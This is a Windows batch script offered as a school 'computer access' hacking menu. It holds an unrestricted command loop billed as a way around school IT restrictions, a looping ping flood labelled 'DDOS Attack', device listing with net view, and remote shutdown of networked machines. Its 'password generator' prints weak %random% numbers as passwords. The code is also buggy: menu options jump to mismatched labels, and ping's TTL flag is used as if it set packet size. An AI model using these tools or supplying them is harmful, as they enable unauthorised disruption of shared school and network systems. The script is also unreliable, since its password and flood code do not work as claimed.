@echo off

title MY COMPUTER ACCESS - v0.1

:MENU

ECHO.

Color 0c
ECHO MY COMPUTER ACCESS - v0.1 CREATED BY ThorAndOdin
ECHO ......
ECHO 1 - Run CMD At School
ECHO 2 - Password Generator
ECHO 3 - Pinger And Packet Sender
ECHO 4 - Pull All Devices on Network
ECHO 5 - Shut Down Computers On Network
ECHO ......
ECHO.

SET /P M=Enter Desired Command:
IF %M%==1 GOTO CMD
IF %M%==Run CMD At School GOTO CMD
IF %M%==2 GOTO PASSGEN
IF %M%==Password Generator GOTO PASSGEN
IF %M%==3 GOTO DEV
IF %M%==Pull All Devices on Network GOTO DEV
IF %M%==4 GOTO PULL
IF %M%==Pull All Devices on Network GOTO PULL
IF %M%==5 GOTO SHUTDOWN
IF %M%==Shut Down Computers On Network GOTO SHUTDOWN

:CMD

cls

@echo off

title CMD

color 0c

echo IT-Department Doesnt Know all Exploits.

echo.

:Loop

set /P the="%cd%>"

%the%

echo.

goto loop

goto menu

:PASSGEN

cls

@echo off
:Start2
cls
goto Start
:Start
title Password Generator
color 0c
echo I will make you a new password.
echo Please write the password down somewhere in case you forget it.
echo ------­------
echo 1) 1 Random Password
echo 2) 5 Random Passwords
echo 3) 10 Random Passwords
echo Input your choice
set input=
set /p input= Choice:
if %input%==1 goto A if NOT goto Start2
if %input%==2 goto B if NOT goto Start2
if %input%==3 goto C if NOT goto Start2
:A
cls
echo Your password is %random%
echo Now choose what you want to do.
echo 1) Go back to the beginning
echo 2) Exit
set input=
set /p input= Choice:
if %input%==1 goto Start2 if NOT goto Start 2
if %input%==2 goto Exit if NOT goto Start 2
:Exit
exit
:B
cls
echo Your 5 passwords are %random%, %random%, %random%, %random%, %random%.
echo Now choose what you want to do.
echo 1) Go back to the beginning
echo 2) Exit
set input=
set /p input= Choice:
if %input%==1 goto Start2 if NOT goto Start 2
if %input%==2 goto Exit if NOT goto Start 2
:C
cls
echo Your 10 Passwords are %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%
echo Now choose what you want to do.
echo 1) Go back to the beginning
echo 2) Exit
set input=
set /p input= Choice:
if %input%==1 goto Start2 if NOT goto Start 2
if %input%==2 goto Exit if NOT goto Start 2

goto loop

goto menu

:DEV

cls

@echo off
mode 67,16
title DDOS Attack
color 0C
cls
echo.
echo ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
echo Pinger and Packet Sende
echo ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
echo.
set /p x=Device Name / Website Link
echo.
echo ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
ping %x%
echo ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
@ping.exe 127.0.0.1 -n 5 -w 1000 > nul
goto Next
:Next
echo.
echo.
echo.
set /p m=Ip Host( the nubers within the []'s ):
echo.
set /p n=Packet Size (32-65000):
echo.
:DDOS
color 0c
echo Serang Server %m%
ping %m% -i %n% -t >nul
goto DDOS

goto loop

goto menu

:PULL

cls

@echo off
title Pull All Devices
net view
color 0C
echo======
echo COMPLETED
echo======
pause

goto loop

goto menu

:SHUTDOWN

shutdown -i

cls

goto menu